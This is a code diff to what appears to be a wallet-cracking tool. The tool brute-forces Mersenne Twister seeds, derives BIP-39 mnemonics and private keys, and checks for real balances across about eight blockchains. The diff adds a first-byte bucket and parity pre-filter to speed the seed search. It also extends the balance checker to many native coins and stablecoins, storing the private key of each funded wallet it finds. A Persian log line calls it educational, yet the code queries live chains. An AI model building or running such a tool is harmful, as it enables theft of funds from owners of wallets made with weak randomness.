@@ -65,8 +65,17 @@ def _chunk_scan(args):
     Returns (lo, hi, scanned, n_derived, records, engine_mode).
     Engine selection mirrors the server-side probe so status reporting is
     honest about what actually executed.
+
+    Two-stage funnel (correctness-preserving — every surviving seed still pays
+    the FULL sha256 BIP-39 checksum exactly as before; nothing is skipped on a
+    heuristic):
+      stage 0  cheap pre-filter on the FIRST output byte only: entropy[0] is
+               the low byte of output #1, so its high nibble (bucket) and bit0
+               are readable without generating bytes 2..16 at all. When the
+               operator restricts buckets, ~15/16 of seeds die here for free.
+      stage 1  full 16-byte buffer + sha256 checksum (exact, unchanged).
     """
-    lo, hi, prune_buckets = args
+    lo, hi, prune_buckets, parity = args
     import hashlib
     from wallet_model import wallet_for_seed
 
@@ -82,19 +91,35 @@ def _chunk_scan(args):
             cnt = min(step, hi - base + 1)
             arr = np.arange(base, base + cnt, dtype=np.uint32)
             bufs = batch_entropy_np(arr)
-            for k in range(cnt):
+            first = bufs[:, 0]               # entropy[0] column (uint8 view)
+            if prune_buckets is not None or parity is not None:
+                bucket = (first >> 4).astype(np.int64)
+                mask = np.ones(cnt, dtype=bool)
+                if prune_buckets is not None:
+                    pb = np.fromiter(prune_buckets, dtype=np.int64,
+                                     count=len(prune_buckets))
+                    mask &= np.isin(bucket, pb)
+                if parity == 0:
+                    mask &= (first & 1) == 0
+                elif parity == 1:
+                    mask &= (first & 1) == 1
+                idx = np.nonzero(mask)[0]
+            else:
+                idx = np.arange(cnt)
+            for k in idx:
                 b = bufs[k].tobytes()
-                if prune_buckets is not None and (b[0] >> 4) not in prune_buckets:
-                    continue                 # fingerprint bucket pruning
                 if hashlib.sha256(b).digest()[0] % 16 == 0:
-                    kept.append(base + k)
+                    kept.append(base + int(k))
             base += cnt
     except ImportError:
         from fast_mt import _first_outputs
         for s in range(lo, hi + 1):
-            buf = bytes(x & 0xFF for x in _first_outputs(s, 16))
-            if prune_buckets is not None and (buf[0] >> 4) not in prune_buckets:
+            o0 = _first_outputs(s, 1)[0] & 0xFF      # entropy[0], 1 output only
+            if prune_buckets is not None and (o0 >> 4) not in prune_buckets:
                 continue
+            if parity is not None and (o0 & 1) != parity:
+                continue
+            buf = bytes(x & 0xFF for x in _first_outputs(s, 16))
             if hashlib.sha256(buf).digest()[0] % 16 == 0:
                 kept.append(s)
 
@@ -128,6 +153,7 @@ class SearchEngine:
         self.derive_only = True           # simulation default; GUI can enable RPC
         self.cpu_budget = 0.35            # fraction of wall-time the pool may burn
         self.fingerprint_prune = ""       # CSV buckets e.g. "0,1,2"; "" = OFF
+        self.parity_filter = ""           # "" off | "even" | "odd" (bit0 of entropy[0])
 
         # state
         self.next_lo = 0                  # resume cursor (chunk-aligned)
@@ -207,6 +233,9 @@ class SearchEngine:
                 "num_workers": self.num_workers, "chunk_size": self.chunk_size,
                 "cpu_budget": self.cpu_budget,
                 "fingerprint_prune": self.fingerprint_prune,
+                "parity_filter": self.parity_filter,
+                "coverage_mode": ("FULL" if not (self.fingerprint_prune or self.parity_filter)
+                                  else "REDUCED"),
                 "threshold_eth": self.threshold_eth,
                 "threshold_usdt": self.threshold_usdt,
                 "derive_only": self.derive_only,
@@ -247,6 +276,11 @@ class SearchEngine:
             span = self.end_seed - self.start_seed + 1
             self.chunk_size = max(1_000, min(int(self.chunk_size), span))
             prune = self._parse_prune()
+            parity = self._parse_parity()
+            if prune is not None or parity is not None:
+                self._log("⚠️ حالت REDUCED-COVERAGE فعال است: فیلتر انگشت‌نگاری "
+                          "برخی seedها را حذف می‌کند و پوشش ۱۰۰٪ نقض می‌شود؛ "
+                          "فقط برای آموزش/شبیه‌سازی استفاده شود.")
             self._log(f"شروع جست‌وجوی موازی: [{self.next_lo} … {self.end_seed}] — "
                       f"{self.num_workers} پروسه، چانک {self.chunk_size}، "
                       f"بودجه CPU {int(self.cpu_budget * 100)}٪"
@@ -306,6 +340,14 @@ class SearchEngine:
         except ValueError:
             return None
 
+    def _parse_parity(self):
+        p = (self.parity_filter or "").strip().lower()
+        if p in ("even", "زوج"):
+            return 0
+        if p in ("odd", "فرد"):
+            return 1
+        return None
+
     def _log(self, msg: str) -> None:
         self.logs.appendleft(f"{time.strftime('%H:%M:%S')} | {msg}")
 
@@ -359,7 +401,8 @@ class SearchEngine:
                     start_at, end = self.next_lo, self.end_seed
                     chunk = self.chunk_size
                     prune = self._parse_prune()
-                jobs = deque((lo, min(lo + chunk - 1, end), prune)
+                    parity = self._parse_parity()
+                jobs = deque((lo, min(lo + chunk - 1, end), prune, parity)
                              for lo in range(start_at, end + 1, chunk))
 
                 inflight: dict[int, tuple] = {}   # lo -> (hi, scanned, nd, recs)
@@ -469,7 +512,18 @@ class SearchEngine:
 
     # ---------------------------------------------------------- balance workers
     def _balance_worker(self) -> None:
-        from balance import get_balance_wei, get_token_balances, wei_to_eth, raw_to_usd
+        """Verify a derived wallet on-chain across ALL configured chains.
+
+        Uses balance.check_all(): Ethereum (ETH + 9 ERC-20), BNB, Polygon,
+        Arbitrum, Optimism, Base, Avalanche (native + tokens) and Tron
+        (TRX + USDT/TRC-20). A wallet counts as funded when ANY asset meets
+        its threshold (threshold_eth applies to native coins, threshold_usdt
+        to stablecoins; any non-zero asset is also recorded in `any_balance`
+        hits so nothing silently disappears)."""
+        from balance import check_all
+        STABLES = {"USDT", "USDC", "BUSD", "USDT-BSC", "USDT-POL",
+                   "USDC-POL", "USDT-TRC20"}
+        NATIVE = {"ETH", "BNB", "POL", "AVAX", "TRX"}
         while not self.stop_event.is_set():
             try:
                 item = self.result_q.get(timeout=0.5)
@@ -478,38 +532,39 @@ class SearchEngine:
             if item is None:
                 break
             s, mn, addr, pk = item
-            if self.derive_only:
-                eth_wei, usdt_raw, usdc_raw = 0, 0, 0
-            else:
-                try:
-                    eth_wei = get_balance_wei(addr)
-                    try:
-                        usdt_raw, usdc_raw = get_token_balances(addr)
-                    except RuntimeError:
-                        usdt_raw = usdc_raw = 0
-                except RuntimeError as exc:
+            assets: dict[str, float] = {}
+            chains_ok: list[str] = []
+            if not self.derive_only:
+                res = check_all(addr)          # never raises
+                assets = res["assets"]
+                chains_ok = res["chains_ok"]
+                if not chains_ok:
                     with self._lock:
                         self.errors += 1
-                        self.last_error = str(exc)[:200]
-                    continue
+                        self.last_error = "همه اندپوینت‌ها پاسخ دادند/ناکام بودند"
             with self._lock:
                 self.balances_checked += 1
                 self.pending_checks = max(0, self.pending_checks - 1)
                 te, ts = self.threshold_eth, self.threshold_usdt
-            eth, usdt, usdc = (wei_to_eth(eth_wei), raw_to_usd(usdt_raw),
-                               raw_to_usd(usdc_raw))
-            hit = ((eth_wei > 0 and eth >= te)
-                   or (usdt_raw > 0 and usdt >= ts)
-                   or (usdc_raw > 0 and usdc >= ts))
+            eth = sum(v for k, v in assets.items() if k in NATIVE)
+            usdt = sum(v for k, v in assets.items() if k in STABLES)
+            usdc = 0.0
+            hit = bool(assets) and (
+                any(k in NATIVE and v >= te for k, v in assets.items())
+                or any(k in STABLES and v >= ts for k, v in assets.items()))
             if hit:
                 rec = {"seed": s, "mnemonic": mn, "address": addr,
-                       "private_key": pk, "wei": str(eth_wei), "eth": eth,
+                       "private_key": pk, "eth": eth,
                        "usdt": usdt, "usdc": usdc,
+                       "assets": assets, "chains_ok": chains_ok,
+                       "funded_total_assets": len(assets),
                        "found_at": time.strftime("%Y-%m-%d %H:%M:%S")}
                 with self._lock:
                     self.funded.append(rec)
-                    self._log(f"ولت دارای موجودی! seed={s} {addr[:10]}… "
-                              f"{eth:.6f} ETH / {usdt:.2f} USDT / {usdc:.2f} USDC")
+                    self._log("ولت دارای موجودی! seed=%s %s… دارایی‌ها: %s"
+                              % (s, addr[:10],
+                                 ", ".join(f"{k}:{v:.6g}"
+                                           for k, v in sorted(assets.items()))))
                 self._append_hit(rec)
 
     @staticmethod
